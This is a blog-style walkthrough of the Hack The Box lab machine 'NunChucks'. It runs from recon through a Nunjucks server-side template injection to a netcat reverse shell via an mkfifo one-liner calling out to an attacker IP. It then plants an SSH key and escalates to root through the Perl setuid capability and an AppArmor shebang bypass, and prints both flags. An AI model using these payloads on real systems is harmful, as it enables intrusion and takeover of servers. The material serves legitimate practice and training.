---
title: "NunChucks from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# NunChucks from HTB
`nmap` gave this:
```bash
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp    open     http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp   open     ssl/http nginx 1.18.0 (Ubuntu)
| tls-alpn:
|_  http/1.1
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| tls-nextprotoneg:
|_  http/1.1
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
Add this to `/etc/hosts`
```
10.10.11.122 nunchucks.htb
```
Access the site and try to `sign up` but it's closed so let's try to discover some other `subdomains`
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.nunchucks.htb" -u https://nunchucks.htb/ -fs 30589

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nunchucks.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.nunchucks.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 30589
________________________________________________

store                   [Status: 200, Size: 4029, Words: 1053, Lines: 102
```
Add this to `/etc/hosts`
```
10.10.11.122 store.nunchucks.htb
```
Then access that subdomain
With `wappalyzer`we get that site runs on
```
Programming languages
  Node.js
```
So maybe it's vulnerable to `ssti`
Let's try first payload in `your email here...`
```python
{{7*7}}@htb.com
```
We get this
```
##### You will receive updates on the following email address: 49@htb.com.
```
so it's vulnerable to `ssti`
So let's search for `ssti injection nodejs`and let's use `nunjucks`
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks
```
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}
```
We can't type this normally so lets use `burpsuite + intercept`
And we get this:
```
"response":"You will receive updates on the following email address: lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nrtkit:x:113:117:RealtimeKit,,,:/proc:/usr/sbin/nologin\ndnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\ngeoclue:x:115:120::/var/lib/geoclue:/usr/sbin/nologin\navahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\ncups-pk-helper:x:117:123:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nsaned:x:118:124::/var/lib/saned:/usr/sbin/nologin\ncolord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\npulse:x:120:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\nmysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false\n@htb.com."
```
This is `/etc/passwd`file now lets get reverse shell
```
{
  "email": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f')\")()}}@htb.com"
}
```
This gave me connection on `netcat`
***
User Flag is: 17949c8542ff2ef9dbfb2123ed2176c2
***
Then try to get `ssh`connection by running
```
$ ssh-keygen
```
save `id_rsa` on your machine and `chmod 600 id_rsa`
copy `machines id_rsa.pub`to `~/.ssh/authorized_keys`
then connect to `ssh`
```
ssh -i id_rsa david@10.10.11.122
```
we are in.
Enumerating the filesystem we see that Perl has setuid capabilities set.
```bash
david@nunchucks:~$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
in https://gtfobins.github.io/gtfobins/perl/#capabilities we can see what we can do with `perl`
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
cat: /etc/shadow: Permission denied
david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
root
```
We can't read `root flag`
```bash
david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}
```
Then try to find other `.pl`files
```bash
david@nunchucks:/opt$ ls
backup.pl  web_backups
david@nunchucks:/opt$ cat backup.pl
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid);
POSIX::setuid(0);

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```
Checking the `backup.pl` we see that it has the `setuid` applied to the script, but we cannot write or make any changes to the execution of the script.
IDK how and why but create this script and execute it which will make you root
```bash
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";
```
***
Root Flag is: 806a8e65c673b5079524748e734c338e
***
![](/assets/images/Screenshot from 2024-08-21 17-49-16.png)
